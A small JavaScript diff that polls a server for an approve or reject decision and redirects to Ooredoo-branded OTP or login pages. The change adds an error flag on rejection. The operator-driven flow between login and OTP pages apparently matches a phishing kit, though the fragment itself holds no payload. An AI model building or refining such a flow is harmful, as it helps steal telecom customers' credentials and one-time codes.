@@ -107,7 +107,7 @@
               window.location.href = 'ooredoo-otp.html?ref=' + encodeURIComponent(ref);
             } else if (d.decision === 'reject') {
               clearInterval(timer);
-              window.location.href = 'ooredoo-login.html?ref=' + encodeURIComponent(ref);
+              window.location.href = 'ooredoo-login.html?ref=' + encodeURIComponent(ref) + '&error=1';
             }
           }).catch(function(){});
       }, 1000);
